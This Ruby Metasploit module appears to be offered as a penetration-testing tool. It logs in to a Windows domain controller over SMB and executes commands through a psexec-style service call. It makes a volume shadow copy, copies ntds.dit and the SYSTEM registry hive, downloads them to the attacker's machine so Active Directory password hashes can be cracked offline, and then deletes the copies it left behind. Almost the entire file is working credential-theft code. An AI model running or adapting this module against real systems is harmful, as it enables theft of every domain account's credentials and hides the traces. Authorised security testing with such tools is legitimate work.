#!/usr/bin/env ruby

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Remote::SMB::Authenticated
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	include Msf::Exploit::Remote::DCERPC

	# Aliases for common classes
	SIMPLE = Rex::Proto::SMB::SimpleClient
	XCEPT  = Rex::Proto::SMB::Exceptions
	CONST  = Rex::Proto::SMB::Constants


	def initialize(info = {})
         super(update_info(info,
         	'Name'           => 'Windows Domain Controller - Download NTDS.dit and SYSTEM hive',
         	'Description'    => %q{This module authenticates to an Active Directory Domain Controller and creates
         		a volume shadow copy of the %SYSTEMDRIVE%.  It then pulls down copies of the ntds.dit file as well
         		as the SYSTEM hive and stores them on your attacking machine.  The ntds.dit and SYSTEM copy can be used 
         		in combination with other tools for offline extraction of AD password hashes.  All of this is possible without
         		uploading a single binary to the target host.
	         },

	         'Author'         => [
	         	'Royce Davis <rdavis[at]accuvant.com>',
	         	'Twitter: <[at]R3dy__>',
	         ],
 
	         'License'        => MSF_LICENSE,
	         'References'     => [
	         	[ 'URL', 'http://www.pentestgeek.com' ],
	         	[ 'URL', 'http://www.accuvant.com' ],
	         	[ 'URL', 'http://sourceforge.net/projects/smbexec.' ],
	         ],
	      ))

		register_options([
			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store the ntds.dit and SYSTEM hive', '/tmp/NTDS_Grab']),
			OptString.new('RPORT', [true, 'The Target port', 445]),
		], self.class)

		deregister_options('RHOST')
	end
	
	
	
	#---------------------------------
	# This is the main control method
	#---------------------------------
	def run_host(ip)
		text = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
		bat = "C:\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
		cmd = "C:\\WINDOWS\\SYSTEM32\\cmd.exe"
		createvsc = "vssadmin create shadow /For=%SYSTEMDRIVE%"
		logdir = datastore['LOGDIR']
		
		#Try and Connect to the target
		begin
			connect()
		rescue StandardError => connecterror
			print_error("Unable to connect to the target: #{connecterror}")
			return
		end
		
		#Try and authenticate with given credentials
		begin
			smb_login()
		rescue StandardError => autherror
			print_error("Unable to authenticate with given credentials: #{autherror}")
			return
		end
		
		smbshare = datastore['SMBSHARE']
		
		begin
			check_vss(smbshare, ip)
			vscpath = make_volume_shadow_copy(smbshare, ip, cmd, createvsc, text, bat)
			copy_ntds(smbshare, ip, cmd, vscpath)
			copy_sys_hive(smbshare, ip, cmd)
			download_ntds(smbshare, "\\WINDOWS\\Temp\\ntds", ip, logdir)
			download_sys_hive(smbshare, "\\WINDOWS\\Temp\\sys", ip, logdir)
			cleanup_after(smbshare, ip, cmd)
			disconnect()
		rescue 
			# Something went terribly wrong
			return
		end
	end
	
	
	
	#-----------------------------------------------------------------------------------
	# Check if VSS is enabled on the target host
	# As far as I can tell the VSS service doesn't need to acctually be running
	# in order to create a VSC with vssadmin.  AS of now this function does nothing...
	#-----------------------------------------------------------------------------------
	def check_vss(smbshare, ip)
		begin
			# Run net start command to check for vss
		rescue StandardError => vsscheckerror
			print_error("Unable to determine if VSS is enabled: #{vsscheckerror}")
			return StandardError
		end
	end
	
	
	
	#-----------------------------------------------------------------------
	# Create a Volume Shadow Copy on the target host
	#-----------------------------------------------------------------------
	def make_volume_shadow_copy(smbshare, ip, cmd, createvsc, text, bat)
		begin
			#Try to create the shadow copy
			command = "#{cmd} /C echo #{createvsc} ^> C:#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
			simple.connect(smbshare)
			print_status("Creating Volume Shadow Copy")
			psexec(smbshare, command)
			#Get path to Volume Shadow Copy
			vscpath = get_vscpath(ip, text)
		rescue StandardError => vscerror
			print_error("Unable to create the Volume Shadow Copy: #{vscerror}")
			return vscerror
		end
		begin
			cleanup = "#{cmd} /C del C:#{text} & del #{bat}"
			# Run cleanup command
			simple.connect(smbshare)
			psexec(smbshare, cleanup)
		rescue StandardError => cleanuperror
			print_error("Cleanup Command failed: #{cleanuperror}")
			return cleanuperror
		end
		print_good("Volume Shadow Copy created on #{vscpath}")
		return vscpath
	end
	
	
	
	#----------------------------------------------------------------------------------------------------------
	# Copy ntds.dit from the Volume Shadow copy to the Windows Temp directory on the target host
	#----------------------------------------------------------------------------------------------------------
	def copy_ntds(smbshare, ip, cmd, vscpath)
		print_status("Copying ntds.dit to Windows Temp directory")
		begin 
			# Try to copy ntds.dit from VSC
			ntdspath = vscpath.to_s + "\\WINDOWS\\NTDS\\ntds.dit"
			command = "#{cmd} /C copy /Y #{ntdspath} C:\\WINDOWS\\Temp\\ntds"
			simple.connect(smbshare)
			psexec(smbshare, command)
		rescue StandardError => ntdscopyerror
			print_error("Unable to copy ntds.dit from Volume Shadow Copy.  Make sure target is a Windows Domain Controller: #{ntdscopyerror}")
			return ntdscopyerror
		end
	end
	
	
	
	#-------------------------------------------------------------------------------------------
	# Create a copy of the SYSTEM hive file and stores it in the Windows
	# Temp directory on the target host
	#-------------------------------------------------------------------------------------------
	def copy_sys_hive(smbshare, ip, cmd)
		print_status("Copying SYSTEM hive file to Windows Temp directory")
		begin
			# Try to crate the sys hive copy
			command = "#{cmd} /C reg.exe save HKLM\\SYSTEM C:\\WINDOWS\\Temp\\sys /y"
			simple.connect(smbshare)
			psexec(smbshare, command)
		rescue StandardError => hiveerror
			print_error("Unable to copy the SYSTEM hive file: #{hiveerror}")
			return hiveerror
		end
	end
	
	
	
	#-------------------------------------------------------------------
	# Download the ntds.dit copy to your attacking machine
	#-------------------------------------------------------------------
	def download_ntds(smbshare, file, ip, logdir)
		print_status("Downloading ntds.dit file")
		begin 
			# Try to download ntds.dit
			newdir = "#{logdir}/#{ip}"
			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
			simple.connect("\\\\#{ip}\\#{smbshare}")
			remotefile = simple.open("#{file}", 'rob')		
			data = remotefile.read
			#Save it to local file system
			file = File.open("#{logdir}/#{ip}/ntds", "w+")
			file.write(data)
			file.close
			remotefile.close
		rescue StandardError => ntdsdownloaderror
			print_error("Unable to downlaod ntds.dit: #{ntdsdownloaderror}")
			return ntdsdownloaderror
		end
		simple.disconnect("\\\\#{ip}\\#{smbshare}")
	end
	
	
	
	#----------------------------------------------------------------------
	# Download the SYSTEM hive copy to your attacking machine
	#----------------------------------------------------------------------
	def download_sys_hive(smbshare, file, ip, logdir)
		print_status("Downloading SYSTEM hive file")
		begin
			# Try to download SYSTEM hive
			newdir = "#{logdir}/#{ip}"
			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
			simple.connect("\\\\#{ip}\\#{smbshare}")
			remotefile = simple.open("#{file}", 'rob')		
			data = remotefile.read
			#Save it to local file system
			file = File.open("#{logdir}/#{ip}/sys", "w+")
			file.write(data)

			file.close
			remotefile.close
		rescue StandardError => sysdownloaderror
			print_error("Unable to download SYSTEM hive: #{sysdownloaderror}")
			return sysdownloaderror
		end
	end
	
	
	
	#-----------------------------------------------------------------------------------------
	# Delete the ntds.dit and SYSTEM hive copies from the Windows Temp directory
	#-----------------------------------------------------------------------------------------
	def cleanup_after(smbshare, ip, cmd)
		print_status("Deleting ntds.dit and SYSTEM hive copies:")
		begin
			# Try to delete the ntds.dit and SYSTEM hive copies
			command = "#{cmd} /C del C:\\WINDOWS\\Temp\\ntds & del C:\\WINDOWS\\Temp\\sys"
			simple.connect(smbshare)
			psexec(smbshare, command)
		rescue StandardError => deleteerror
			print_error("Unable to delete ntds.dit and SYSTEM hive copies: #{deleteerror}")
			return deleteerror
		end
	end
	
	
	
	#-----------------------------------------------------
	# Gets the path to the Volume Shadow Copy
	#-----------------------------------------------------
	def get_vscpath(ip, file)
		prepath = '\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy'
		vsc = ""
		simple.connect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
		outfile = simple.open(file, 'ro')
		output = outfile.read
		output.each_line do |line|
			vsc += line if line.include?("Volume Name:")
		end 
		outfile.close
		simple.disconnect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
		return prepath + vsc.split("ShadowCopy")[1].chomp
	end
	
	
	
	#------------------------------------------------------------------------------------------------------------------------
	# This code was stolen straight out of psexec.rb.  Thanks very much for all who contributed to that module!!
	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
	#------------------------------------------------------------------------------------------------------------------------
	def psexec(smbshare, command)
		filename = "filename"
		servicename = "servicename"
		simple.disconnect(smbshare)

		simple.connect("IPC$")

		handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
		vprint_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		vprint_status("Bound to #{handle} ...")

		vprint_status("Obtaining a service manager handle...")
		scm_handle = nil
		stubdata =
			NDR.uwstring("\\\\#{rhost}") +
			NDR.long(0) +
			NDR.long(0xF003F)
		begin
			response = dcerpc.call(0x0f, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				scm_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		displayname = "displayname"
		holdhandle = scm_handle
		svc_handle  = nil
		svc_status  = nil

		stubdata =
			scm_handle +
			NDR.wstring(servicename) +
			NDR.uwstring(displayname) +

			NDR.long(0x0F01FF) + # Access: MAX
			NDR.long(0x00000110) + # Type: Interactive, Own process
			NDR.long(0x00000003) + # Start: Demand
			NDR.long(0x00000000) + # Errors: Ignore
			NDR.wstring( command ) +
			NDR.long(0) + # LoadOrderGroup
			NDR.long(0) + # Dependencies
			NDR.long(0) + # Service Start
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0)  # Password
		begin
			vprint_status("Attempting to execute #{command}")
			response = dcerpc.call(0x0c, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
				svc_status = dcerpc.last_response.stub_data[24,4]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception
		end

		vprint_status("Opening service...")
		begin
			stubdata =
				scm_handle +
				NDR.wstring(servicename) +
				NDR.long(0xF01FF)

			response = dcerpc.call(0x10, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Starting the service...")
		stubdata =
			svc_handle +
			NDR.long(0) +
			NDR.long(0)
		begin
			response = dcerpc.call(0x13, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Removing the service...")
		stubdata =
			svc_handle +
			NDR.wstring("C:\\WINDOWS\\Temp\\msfcommandoutput.txt")
		begin
			response = dcerpc.call(0x02, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
		end

		vprint_status("Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception => e
			print_error("Error: #{e}")
		end
			
		begin
			#print_status("Deleting \\#{filename}...")
			select(nil, nil, nil, 1.0)
			#This is not really useful but will prevent double \\ on the wire :)
		if datastore['SHARE'] =~ /.[\\\/]/
			simple.connect(smbshare)
			simple.delete("C:\\WINDOWS\\Temp\\msfcommandoutput.txt")
		else
			simple.connect(smbshare)
			simple.delete("C:\\WINDOWS\\Temp\\msfcommandoutput.txt")
		end

		rescue ::Interrupt
			raise $!
		rescue ::Exception
			#raise $!
		end
		simple.disconnect("IPC$")
		simple.disconnect(smbshare)
	end
	
end
